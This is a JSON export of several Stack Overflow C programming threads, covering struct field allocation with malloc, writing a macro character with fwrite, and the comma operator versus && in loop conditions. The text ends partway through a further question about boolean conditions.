[{"tags": ["c", "dynamic-memory-allocation"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1499298458, "post_id": 44937645, "comment_id": 76851689, "body": "<code>malloc(sizeof(strlen(name) + 1)));</code>&lt;&lt;- strlen() yields a size_t, so you alloc <code>sizeof(size_t) +1</code> here ... AND: youneed a <code>&#39;;&#39;</code> after <code>} Superstruct</code>"}, {"owner": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1499298518, "post_id": 44937645, "comment_id": 76851700, "body": "@wildplasser I&#39;m sorry, I don&#39;t quite understand. Is size_t not what I want here?"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1499299938, "post_id": 44937645, "comment_id": 76851998, "body": "I rolled back your edits. They may solve the errors, but they render the answer(s) useless."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 1, "creation_date": 1499300481, "post_id": 44937645, "comment_id": 76852119, "body": "@Chris: read about <a href=\"https://en.wikipedia.org/wiki/Flexible_array_member\" rel=\"nofollow noreferrer\">flexible array member</a>. That could be useful in your case: you could exchange the order of <code>substructs</code> &amp; <code>num_substructs</code>then end your <code>struct</code> with <code>Substruct *substructs[];</code>"}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1499300645, "post_id": 44937645, "comment_id": 76852161, "body": "BTW, there is a typo in the question; <code>Substruct **substructs</code> should be followed by a semi-colon <code>;</code>not by a comma <code>,</code>"}, {"owner": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "reply_to_user": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1499300775, "post_id": 44937645, "comment_id": 76852193, "body": "@BasileStarynkevitch ok, noted"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499311185, "post_id": 44937645, "comment_id": 76854686, "body": "&quot;allocate memory for (and initialize) <code>super</code>&quot; --&gt; I doubt that is the correct goal.  I&#39;d expect &quot;allocate memory for (and initialize) <code>*super</code>&quot;."}, {"owner": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499312068, "post_id": 44937645, "comment_id": 76854877, "body": "@chux you&#39;re correct that we&#39;re not initializing <code>super</code> - really we&#39;re initializing <code>**super</code>."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "reply_to_user": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1499312788, "post_id": 44937645, "comment_id": 76855075, "body": "@BasileStarynkevitch I would not recommend using flexible array member for any new code (except possibly specialized high performance scenarios)... they were only added to the standard to allow any existing code using the struct-hack to be made compliant.  They are more problematic to use than normal structs."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 1, "creation_date": 1499314597, "post_id": 44937645, "comment_id": 76855518, "body": "@M.M. That is your opinion, and I strongly disagree with it. Flexible array members are a very useful feature of C99"}], "answers": [{"comments": [{"owner": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "edited": false, "score": 0, "creation_date": 1499298934, "post_id": 44937691, "comment_id": 76851799, "body": "I do want an array of pointers to the structures, because that&#39;s the prototype I&#39;m supposed to work with. And I understand your first point (about **super) but can you comment on the rest of what I wrote?"}, {"owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "reply_to_user": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "edited": false, "score": 0, "creation_date": 1499299244, "post_id": 44937691, "comment_id": 76851858, "body": "I&#39;ve added some notes about the <code>name</code> field which I omitted earlier."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "reply_to_user": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "edited": false, "score": 0, "creation_date": 1499299248, "post_id": 44937691, "comment_id": 76851860, "body": "@Chris: why dont you <i>return</i> the pointer to the allocated(array of) struct, instead of passing it by &quot;reference&quot;?"}, {"owner": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "edited": false, "score": 0, "creation_date": 1499299299, "post_id": 44937691, "comment_id": 76851869, "body": "Aw nuts. Ok, I should have caught that 2nd one."}, {"owner": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "edited": false, "score": 0, "creation_date": 1499299747, "post_id": 44937691, "comment_id": 76851960, "body": "Thank you @duskwuff. I think this answered all of my questions for now :)"}, {"owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499311552, "post_id": 44937691, "comment_id": 76854754, "body": "@chux Thanks -- I changed that variable&#39;s name at the last moment and missed that reference."}], "tags": [], "owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "is_accepted": true, "score": 4, "last_activity_date": 1499311345, "last_edit_date": 1499311345, "creation_date": 1499298623, "answer_id": 44937691, "question_id": 44937645, "link": "https://stackoverflow.com/questions/44937645/mallocing-for-field-inside-struct/44937691#44937691", "title": "malloc&#39;ing for field inside struct", "body": "<p>First:</p>\n\n<pre><code>*super = malloc(sizeof(*super));\n</code></pre>\n\n<p>You want <code>sizeof(**super)</code>. <code>*super</code> is a pointer, with type <code>Superstruct *</code>, so this won't allocate enough memory.</p>\n\n<p>Really, you should probably allocate the structure normally, then assign it to the pointer separately. This will make your code much easier to write:</p>\n\n<pre><code>Superstruct *r = malloc(sizeof *r);\nr-&gt;name = \u2026\n*super = r;\n</code></pre>\n\n<hr>\n\n<p>Second:</p>\n\n<pre><code>*super-&gt;name = malloc(sizeof(strlen(name) + 1)));\n</code></pre>\n\n<p>This is wrong. <code>sizeof(strlen(name) + 1)</code> is <code>sizeof(int)</code> (or perhaps <code>sizeof(size_t)</code>; either way it's not what you want) -- <code>strlen()</code> won't even be called! Remove the <code>sizeof()</code> from this expression to make it correct.</p>\n\n<hr>\n\n<p>Third: to allocate a single array of <code>Substruct</code> objects, define the structure member as <code>Substruct *substructs</code>, and allocate it using the exact code you've got right now. You don't need a double pointer unless you want an array of <em>pointers</em> to the structures, which is more complicated than you need.</p>\n\n<p>If you really think you do need an array of pointers here (you probably don't), you need to allocate the array using <code>sizeof(Substruct *)</code> as the <code>size</code> argument to <code>calloc()</code>, not <code>sizeof(Substruct)</code>.</p>\n"}], "owner": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 744, "favorite_count": 0, "accepted_answer_id": 44937691, "answer_count": 1, "score": -2, "last_activity_date": 1499311345, "creation_date": 1499298324, "last_edit_date": 1499299856, "question_id": 44937645, "link": "https://stackoverflow.com/questions/44937645/mallocing-for-field-inside-struct", "title": "malloc&#39;ing for field inside struct", "body": "<p>I have, roughly speaking, a function prototype like this: </p>\n\n<pre><code>init_superstruct(const char *name, Superstruct **super, int num_substructs) {...\n</code></pre>\n\n<p>where superstruct looks like </p>\n\n<pre><code>typedef struct superstruct {\n    char *name, \n    Substruct **substructs, \n    int num_substructs;\n} Superstruct\n</code></pre>\n\n<p>The function is supposed to </p>\n\n<p>1) allocate memory for (and initialize) super, by...</p>\n\n<p>2) ...assigning the name field of super enough memory to hold the name argument, and... </p>\n\n<p>3) ...assigning the substructs field enough memory to hold an array pointers to Substructs (of size num_substructs).</p>\n\n<p><strong>My question</strong>: will the following code accomplish these goals? </p>\n\n<pre><code>*super = malloc(sizeof(*super));\n*super-&gt;name = malloc(sizeof(strlen(name) + 1)));\n*super-&gt;substructs = calloc(num_substructs, sizeof(Substruct));\n</code></pre>\n\n<hr>\n\n<p>This is literally my first foray into dynamic memory allocation. Any advice you have would be helpful for me!</p>\n"}, {"tags": ["c", "file"], "comments": [{"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1499297830, "post_id": 44937521, "comment_id": 76851531, "body": "You&#39;re asking for the address of the number 70 -- that&#39;s not meaningful. If you actually want to put that number into a location and then take that address, you&#39;ll have to do something that allocates space (that is, make a variable or constant), then take its address."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 4, "creation_date": 1499297919, "post_id": 44937521, "comment_id": 76851557, "body": "<code>putc( END_CHAR, file_output);</code>"}, {"owner": {"reputation": 31, "user_id": 3746445, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cd996edc897c9c91d743f3a6fb485fee?s=128&d=identicon&r=PG&f=1", "display_name": "Andibadia", "link": "https://stackoverflow.com/users/3746445/andibadia"}, "edited": false, "score": 0, "creation_date": 1499304994, "post_id": 44937521, "comment_id": 76853183, "body": "Thanks! I actually ended up using this because I didn&#39;t want to create a new variable."}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 3746445, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cd996edc897c9c91d743f3a6fb485fee?s=128&d=identicon&r=PG&f=1", "display_name": "Andibadia", "link": "https://stackoverflow.com/users/3746445/andibadia"}, "edited": false, "score": 0, "creation_date": 1499304970, "post_id": 44937609, "comment_id": 76853174, "body": "Thanks for the help!"}], "tags": [], "owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "is_accepted": true, "score": 1, "last_activity_date": 1499298015, "creation_date": 1499298015, "answer_id": 44937609, "question_id": 44937521, "link": "https://stackoverflow.com/questions/44937521/write-a-char-macro-to-a-binary-file/44937609#44937609", "title": "Write a char macro to a binary file", "body": "<p>In C, <code>'F'</code> is just a way of writing the number 70 (assuming ASCII), so it's just a number, and you can't take the address of a number, only a variable. <code>#define</code> doesn't change that. So make a variable:</p>\n\n<pre><code>char endchar = 'F';\n\nfwrite(&amp;endchar, ...\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 3746445, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cd996edc897c9c91d743f3a6fb485fee?s=128&d=identicon&r=PG&f=1", "display_name": "Andibadia", "link": "https://stackoverflow.com/users/3746445/andibadia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 79, "favorite_count": 1, "accepted_answer_id": 44937609, "answer_count": 1, "score": -1, "last_activity_date": 1499298015, "creation_date": 1499297399, "question_id": 44937521, "link": "https://stackoverflow.com/questions/44937521/write-a-char-macro-to-a-binary-file", "title": "Write a char macro to a binary file", "body": "<p>I've been working on some code that basically just tries to write a struct to a binary file in the form of a list, which isn't a problem, but I also need to write a macro at the end of every structure, the which is a char (I called it END_CHAR). What I use trying to do was:  </p>\n\n<pre><code>#define END_CHAR 'F'\n/*Some irrelevant code here*/\nfwrite(&amp;END_CHAR,sizeof(char),1,file_output);\n</code></pre>\n\n<p>I understand that this doesn't work because I'm asking the memory address of a char that isn't stored in any variable. So, what is the proper way to do what I want to do?</p>\n"}, {"tags": ["c", "loops", "difference"], "comments": [{"owner": {"reputation": 5498, "user_id": 1228887, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8dbfa9c3ff51140d2e1a5ff553725a07?s=128&d=identicon&r=PG", "display_name": "twain249", "link": "https://stackoverflow.com/users/1228887/twain249"}, "edited": false, "score": 1, "creation_date": 1499295687, "post_id": 44937277, "comment_id": 76850952, "body": "This has been answered. <a href=\"https://stackoverflow.com/questions/54142/how-does-the-comma-operator-work\" title=\"how does the comma operator work\">stackoverflow.com/questions/54142/&hellip;</a>"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1499297368, "post_id": 44937277, "comment_id": 76851403, "body": "The suggested duplicate only explains one of the two snippets ... not really a duplicate as such"}], "answers": [{"comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 1, "creation_date": 1499296909, "post_id": 44937302, "comment_id": 76851296, "body": "This is correct; not sure why someone downvoted it"}, {"owner": {"reputation": 3569, "user_id": 302898, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/pfvUF.jpg?s=128&g=1", "display_name": "Sean", "link": "https://stackoverflow.com/users/302898/sean"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1499321263, "post_id": 44937302, "comment_id": 76857624, "body": "Now it seems that two people have downvoted \ud83e\udd14"}], "tags": [], "owner": {"reputation": 3569, "user_id": 302898, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/pfvUF.jpg?s=128&g=1", "display_name": "Sean", "link": "https://stackoverflow.com/users/302898/sean"}, "is_accepted": false, "score": 1, "last_activity_date": 1499321092, "last_edit_date": 1499321092, "creation_date": 1499295721, "answer_id": 44937302, "question_id": 44937277, "link": "https://stackoverflow.com/questions/44937277/c-loop-with-two-conditions-difference/44937302#44937302", "title": "C loop with two conditions - difference", "body": "<p>In the second code block, only <code>i &lt; 3</code> is actually used to evaluate whether the loop should exit. The <code>i &lt; 5</code> expression is evaluated, but its value is discarded. See the <a href=\"https://en.wikipedia.org/wiki/Comma_operator\" rel=\"nofollow noreferrer\">comma operator</a> for more info.</p>\n\n<p>There is functionally no difference between your examples because <code>i &lt; 3</code> is the limiting expression and appears second. Both loops will exit when i reaches 3. However, if you switched the terms so that you have <code>i &lt; 3, i &lt; 5</code>, then the second kicks out when it reaches 5 because only the value of <code>i &lt; 5</code> is considered.</p>\n"}, {"comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1499298855, "post_id": 44937366, "comment_id": 76851780, "body": "Just to be precise, the other expressions are evaluated (in left-to-right order) before the rightmost expression. If there are side effects, the order matters."}, {"owner": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1499330913, "post_id": 44937366, "comment_id": 76863484, "body": "@Barmar Please clarify. In the case of the comma operator the order matters even without side effects."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "edited": false, "score": 0, "creation_date": 1499345422, "post_id": 44937366, "comment_id": 76873795, "body": "@klutt If there are no side effects, what difference does order of execution make? As long as it returns the value of the right-hand expression you can&#39;t tell which order it executed them."}, {"owner": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1499345673, "post_id": 44937366, "comment_id": 76874010, "body": "@Barmar The difference is which expression that counts. In the case of <code>&amp;&amp;</code> the order only matters if there are side effects, but with the comma operator you&#39;ll get different results regardless."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "edited": false, "score": 0, "creation_date": 1499346623, "post_id": 44937366, "comment_id": 76874744, "body": "@klutt If you have <code>a+ 3, b + 4</code>, what difference does it make what order it does the additions, as long as the result is <code>b + 4</code>?"}, {"owner": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1499346827, "post_id": 44937366, "comment_id": 76874904, "body": "@Barmar <code>for(i=0; i&lt;5 , i&lt;3; i++)</code> and <code>for(i=0; i&lt;3, i&lt;5; i++)</code> are not equivalent, but neither <code>i&lt;3</code> nor <code>i&lt;5</code> has side effects. What you first wrote is not logically wrong, but it may sound like you&#39;re implying that the order does not matter if there&#39;s no side effects. I just wanted everything to be clear."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "edited": false, "score": 0, "creation_date": 1499346907, "post_id": 44937366, "comment_id": 76874963, "body": "@klutt I meant that the order that they are <i>executed</i> matters, not the order that they&#39;re <i>written</i>."}, {"owner": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1499347001, "post_id": 44937366, "comment_id": 76875033, "body": "@Barmar Then we&#39;re clear. :)"}], "tags": [], "owner": {"reputation": 13016, "user_id": 8751754, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7k6Li.png?s=128&g=1", "display_name": "Ron", "link": "https://stackoverflow.com/users/8751754/ron"}, "is_accepted": false, "score": 0, "last_activity_date": 1499328301, "last_edit_date": 1499328301, "creation_date": 1499296189, "answer_id": 44937366, "question_id": 44937277, "link": "https://stackoverflow.com/questions/44937277/c-loop-with-two-conditions-difference/44937366#44937366", "title": "C loop with two conditions - difference", "body": "<p>When using the comma operator <code>,</code> in a statement like the:</p>\n\n<pre><code>( &lt;expression1&gt;, &lt;expression2&gt; )\n</code></pre>\n\n<p>the <code>&lt;expression1&gt;</code> is evaluated and discarded, then the <code>&lt;expression2&gt;</code> is evaluated and its value is returned. In summary the right most expression is evaluated and its value returned. Other expressions are evaluated and discarded. So your statement of:</p>\n\n<pre><code>for(i=0; i&lt;5 , i&lt;3; i++)\n</code></pre>\n\n<p>is equivalent to:</p>\n\n<pre><code>for(i=0; i&lt;3; i++)\n</code></pre>\n\n<p>As for the first statement, this expression:</p>\n\n<pre><code>(i&lt;5 &amp;&amp; i&lt;3)\n</code></pre>\n\n<p>is a simple AND boolean evaluation. A <em>funny</em> one because it is enough to say:</p>\n\n<pre><code>(i&lt;3)\n</code></pre>\n\n<p>Long story short, who ever made this example probably expects you to say \"<em>both conditions evaluate to second expression</em>\".</p>\n"}, {"tags": [], "owner": {"reputation": 25106, "user_id": 6699433, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/1mOTM.jpg?s=128&g=1", "display_name": "klutt", "link": "https://stackoverflow.com/users/6699433/klutt"}, "is_accepted": false, "score": 0, "last_activity_date": 1499296196, "creation_date": 1499296196, "answer_id": 44937368, "question_id": 44937277, "link": "https://stackoverflow.com/questions/44937277/c-loop-with-two-conditions-difference/44937368#44937368", "title": "C loop with two conditions - difference", "body": "<p>In this case they will do exactly the same. </p>\n\n<p>The thing that differs is that in the first case <code>i&lt;3</code> will not be evaluated every time. A statement on the form <code>A &amp;&amp; B</code> will only execute <code>B</code> if the return value of <code>A</code> is <code>true</code>. The reason is that the logical value of <code>&amp;&amp;</code> is true if both operands are true. If one of them are false, the whole expression is false, so if the left operand evaluates to false, there's no need to evaluate the right operand.</p>\n\n<p>The comma operator on the other hand evaluates both operands, but the result of the left operand is discarded.</p>\n"}], "owner": {"reputation": 49, "user_id": 3719408, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/8vbvQ.jpg?s=128&g=1", "display_name": "Sheep", "link": "https://stackoverflow.com/users/3719408/sheep"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 147, "favorite_count": 0, "closed_date": 1499335170, "answer_count": 3, "score": 0, "last_activity_date": 1499328301, "creation_date": 1499295559, "question_id": 44937277, "link": "https://stackoverflow.com/questions/44937277/c-loop-with-two-conditions-difference", "closed_reason": "Duplicate", "title": "C loop with two conditions - difference", "body": "<p>Whats the difference between:</p>\n\n<pre><code>int i;\nfor( i=0;i&lt;5 &amp;&amp; i&lt;3;i++)\n{\n    printf(\"stackoverflow.com\");\n}\n</code></pre>\n\n<p>and</p>\n\n<pre><code>int i;\nfor( i=0;i&lt;5 , i&lt;3;i++)\n{\n    printf(\"stackoverflow.com\");\n}\n</code></pre>\n\n<p>I mean use of &amp;&amp; instead of ','</p>\n\n<p>Regards</p>\n"}, {"tags": ["c", "boolean", "conditional-statements"], "comments": [{"owner": {"reputation": 268334, "user_id": 4909087, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/LmD3e.png?s=128&g=1", "display_name": "cs95", "link": "https://stackoverflow.com/users/4909087/cs95"}, "edited": false, "score": 0, "creation_date": 1499295418, "post_id": 44937243, "comment_id": 76850878, "body": "<code>if (  (100==100) &amp;&amp; (num == 10 || num == 100) ) { ... 